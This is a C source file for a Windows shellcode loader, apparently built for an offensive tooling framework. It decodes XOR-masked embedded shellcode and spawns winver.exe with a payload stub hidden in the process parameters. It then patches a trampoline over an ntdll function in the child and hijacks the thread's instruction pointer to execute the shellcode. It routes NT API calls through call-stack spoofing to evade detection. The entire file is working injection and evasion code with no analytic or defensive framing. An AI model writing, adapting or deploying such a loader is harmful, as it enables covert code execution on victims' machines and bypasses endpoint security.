#include <windows.h>
#include <stdint.h>

#include "native.h"
#include "tcg.h"
#include "dfr.h"
#include "shellwriter.h"
#include "spoof.h"

#define GETRESOURCE(x) (char *)&x
#define memset(x, y, z) __stosb((unsigned char *)x, y, z);

typedef struct
{
    int length;
    char value[];
} RESOURCE;

char __SC__[0] __attribute__((section("sc")));
char __MASK__[0] __attribute__((section("mask")));

void go()
{
    dprintf("[+] go() loader running\n");

    init_spoof();
    dprintf("[+] gadget=0x%llx\n", g_ctx.gadget);

    /* ── Unmask shellcode ──────────────────────────────────────────── */
    RESOURCE *masked_sc = (RESOURCE *)GETRESOURCE(__SC__);
    RESOURCE *mask_key = (RESOURCE *)GETRESOURCE(__MASK__);

    char unmasked_sc[masked_sc->length];
    for (int i = 0; i < masked_sc->length; i++)
        unmasked_sc[i] = masked_sc->value[i] ^ mask_key->value[i % mask_key->length];

    /* ── Build ShellCodeWriter stub ────────────────────────────────── */
    u8 stub[SCW_BUF_LARGE];
    int _i;
    for (_i = 0; _i < SCW_BUF_LARGE; _i++)
        stub[_i] = 0;

    SCW w;
    scw_init(&w, stub, sizeof(stub));
    // scw_load_and_call(&w,(u64)KERNEL32$VirtualAlloc,(u64)KERNEL32$VirtualProtect, (const u8 *)unmasked_sc, masked_sc->length);
    /* TO DO: select a better module and fn for stomping */
    scw_stomp_and_call(&w,
                       (u64)KERNEL32$VirtualProtect,
                       "kernel32.dll",
                       "BaseCheckAppcompatCache",
                       (const u8 *)unmasked_sc, masked_sc->length);

    dprintf("[+] stub: %d bytes, nulls: %s\n",
            w.len, scw_check_nulls(&w) == -1 ? "none" : "BUG");

    /* ── Spawn winver.exe with poisoned params ────────────────────────────────── */
    wchar_t ntPath[] = {
        L'\\', L'?', L'?', L'\\',
        L'C', L':', L'\\',
        L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\',
        L'S', L'y', L's', L't', L'e', L'm', L'3', L'2', L'\\',
        L'w', L'i', L'n', L'v', L'e', L'r', L'.', L'e', L'x', L'e', // winver.exe
        // L'n', L'o', L't', L'e', L'p', L'a', L'd', L'.', L'e', L'x', L'e', // notepad.exe
        // L'w', L'e', L'r', L'f', L'a', L'u', L'l', L't', L'.', L'e', L'x', L'e', // werfault.exe
        // L'x', L'w', L'i', L'z', L'a', L'r', L'd', L'.', L'e', L'x', L'e', // xwizard.exe
        // L'c', L'o', L'l', L'o', L'r', L'c', L'p', L'l', L'.', L'e', L'x', L'e', // colorcpl.exe
        L'\0'};

    UNICODE_STRING imagePath = {
        .Buffer = ntPath,
        .Length = (USHORT)(sizeof(ntPath) - sizeof(wchar_t)),
        .MaximumLength = sizeof(ntPath)};

    UNICODE_STRING shellInfoStr = {
        .Buffer = (PWSTR)stub,
        .Length = (USHORT)w.len,
        .MaximumLength = (USHORT)sizeof(stub)};

    PRTL_USER_PROCESS_PARAMETERS procParams = NULL;

    NTSTATUS status = NTDLL$RtlCreateProcessParametersEx(
        &procParams, &imagePath,
        NULL, NULL, NULL, NULL, NULL, NULL,
        &shellInfoStr, NULL,
        RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

    if (!NT_SUCCESS(status))
    {
        dprintf("[-] RtlCreateProcessParametersEx: 0x%X\n", status);
        return;
    }

    PS_CREATE_INFO createInfo = {0};
    createInfo.Size = sizeof(PS_CREATE_INFO);

    PS_ATTRIBUTE_LIST attrList = {0};
    attrList.TotalLength = sizeof(PS_ATTRIBUTE_LIST);
    attrList.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    attrList.Attributes[0].Size = imagePath.Length;
    attrList.Attributes[0].ValuePtr = imagePath.Buffer;
    attrList.Attributes[0].ReturnLength = NULL;

    HANDLE hProcess = NULL, hThread = NULL;

    status = (NTSTATUS)spoof_call(
        (u64)NTDLL$NtCreateUserProcess,
        (u64)&hProcess, (u64)&hThread,
        (u64)PROCESS_ALL_ACCESS, (u64)THREAD_ALL_ACCESS,
        (u64)NULL, (u64)NULL, (u64)0, (u64)0,
        (u64)procParams, (u64)&createInfo, (u64)&attrList);

    if (!NT_SUCCESS(status))
    {
        dprintf("[-] NtCreateUserProcess: 0x%X\n", status);
        return;
    }

    /* ── Wait for child PEB to be ready ────────────────────────────── */
    /* poor mans sleep */
    unsigned long long start, now;
    unsigned long long cycles = 300 * 3000000ULL; /* 3M cycles per ms */
    __asm__ volatile("rdtsc" : "=A"(start));
    do
    {
        __asm__ volatile("rdtsc" : "=A"(now));
    } while ((now - start) < cycles);

    /* ── Read child PEB → ProcessParameters → ShellInfo.Buffer ────── */
    PROCESS_BASIC_INFORMATION pbi = {0};
    DWORD retLen = 0;
    SIZE_T bytesRead = 0;

    status = (NTSTATUS)spoof_call(
        (u64)NTDLL$NtQueryInformationProcess,
        (u64)hProcess, (u64)0,
        (u64)&pbi, (u64)sizeof(pbi), (u64)&retLen,
        0, 0, 0, 0, 0, 0);
    if (!NT_SUCCESS(status))
    {
        dprintf("[-] NtQueryInformationProcess: 0x%X\n", status);
        return;
    }

    dprintf("[+] PID: %llu PEB: 0x%llx\n",
            pbi.UniqueProcessId, (u64)pbi.PebBaseAddress);

    PEB pebLocal = {0};
    status = (NTSTATUS)spoof_call(
        (u64)NTDLL$NtReadVirtualMemory,
        (u64)hProcess, (u64)pbi.PebBaseAddress,
        (u64)&pebLocal, (u64)sizeof(pebLocal), (u64)&bytesRead,
        0, 0, 0, 0, 0, 0);
    if (!NT_SUCCESS(status))
    {
        dprintf("[-] NtReadVirtualMemory (PEB): 0x%X\n", status);
        return;
    }

    RTL_USER_PROCESS_PARAMETERS parameters = {0};
    status = (NTSTATUS)spoof_call(
        (u64)NTDLL$NtReadVirtualMemory,
        (u64)hProcess, (u64)pebLocal.ProcessParameters,
        (u64)&parameters, (u64)sizeof(parameters), (u64)&bytesRead,
        0, 0, 0, 0, 0, 0);
    if (!NT_SUCCESS(status))
    {
        dprintf("[-] NtReadVirtualMemory (ProcessParameters): 0x%X\n", status);
        return;
    }

    /* ── Make shellcode page executable ───────────────────────────── */
    PVOID shellcode = (PVOID)parameters.ShellInfo.Buffer;
    ULONG_PTR unaligned = (ULONG_PTR)shellcode;
    PVOID base = (PVOID)(unaligned & ~(4096 - 1));
    SIZE_T shellcodeSize = (SIZE_T)w.len + (unaligned - (ULONG_PTR)base);
    ULONG oldp = 0;

    status = (NTSTATUS)spoof_call(
        (u64)NTDLL$NtProtectVirtualMemory,
        (u64)hProcess, (u64)&base,
        (u64)&shellcodeSize, (u64)PAGE_EXECUTE_READ, (u64)&oldp,
        0, 0, 0, 0, 0, 0);
    if (!NT_SUCCESS(status))
    {
        dprintf("[-] NtProtectVirtualMemory: 0x%X\n", status);
        return;
    }

    /* ── Hijack child thread RIP → shellcode ───────────────────────── */
    // static CONTEXT ctx_storage;
    // CONTEXT *ctx = &ctx_storage;
    __attribute__((aligned(16))) CONTEXT ctx_storage = {0};
    CONTEXT *ctx = &ctx_storage;
    for (int _z = 0; _z < (int)sizeof(CONTEXT); _z++)
        ((u8 *)ctx)[_z] = 0;
    ctx->ContextFlags = CONTEXT_CONTROL;

    status = (NTSTATUS)spoof_call(
        (u64)NTDLL$NtGetContextThread,
        (u64)hThread, (u64)ctx,
        0, 0, 0, 0, 0, 0, 0, 0, 0);
    if (!NT_SUCCESS(status))
    {
        dprintf("[-] NtGetContextThread: 0x%X\n", status);
        return;
    }

    /* ── Build trampoline → shellcode ─────────────────────────────── */
    /* jmp [rip+0] + shellcode_addr = 14 bytes */
    u8 trampoline[14];
    trampoline[0] = 0xFF;
    trampoline[1] = 0x25;
    trampoline[2] = 0x00;
    trampoline[3] = 0x00;
    trampoline[4] = 0x00;
    trampoline[5] = 0x00;
    *(u64 *)(trampoline + 6) = (u64)shellcode;

    /* ── Find target function in child (same base as parent) ───────── */
    u64 target_fn = (u64)NTDLL$RtlSetThreadIsCritical;

    /* ── Make target function writable in child ────────────────────── */
    PVOID tramp_base = (PVOID)(target_fn & ~(4096 - 1));
    PVOID tramp_base_orig = tramp_base;
    // SIZE_T tramp_size = 14 + (target_fn - (u64)tramp_base);
    SIZE_T tramp_size = 4096;
    SIZE_T tramp_size_orig = tramp_size;

    ULONG tramp_oldp = 0;

    status = (NTSTATUS)spoof_call(
        (u64)NTDLL$NtProtectVirtualMemory,
        (u64)hProcess, (u64)&tramp_base,
        (u64)&tramp_size, (u64)PAGE_READWRITE, (u64)&tramp_oldp,
        0, 0, 0, 0, 0, 0);
    if (!NT_SUCCESS(status))
    {
        dprintf("[-] NtProtectVirtualMemory (trampoline): 0x%X\n", status);
        return;
    }

    /* ── Write trampoline into child ───────────────────────────────── */
    SIZE_T written = 0;
    status = (NTSTATUS)spoof_call(
        (u64)NTDLL$NtWriteVirtualMemory,
        (u64)hProcess, (u64)target_fn,
        (u64)trampoline, (u64)14, (u64)&written,
        0, 0, 0, 0, 0, 0);
    if (!NT_SUCCESS(status))
    {
        dprintf("[-] NtWriteVirtualMemory: 0x%X\n", status);
        return;
    }

    tramp_base = tramp_base_orig;
    tramp_size = tramp_size_orig;
    /* ── Restore protection ─────────────────────────────────────────── */
    status = (NTSTATUS)spoof_call(
        (u64)NTDLL$NtProtectVirtualMemory,
        (u64)hProcess, (u64)&tramp_base,
        (u64)&tramp_size, (u64)PAGE_EXECUTE_READ,
        (u64)&tramp_oldp,
        0, 0, 0, 0, 0, 0);

    /* ── Set RIP to trampoline target (not shellcode directly) ─────── */
    ctx->Rip = target_fn;
    // ctx->Rip = (DWORD64)shellcode;

    status = (NTSTATUS)spoof_call(
        (u64)NTDLL$NtSetContextThread,
        (u64)hThread, (u64)ctx,
        0, 0, 0, 0, 0, 0, 0, 0, 0);
    if (!NT_SUCCESS(status))
    {
        dprintf("[-] NtSetContextThread: 0x%X\n", status);
        return;
    }

    dprintf("[+] RIP → trampoline → shellcode\n");
    dprintf("[+] === EXIT LOADER ===\n");
}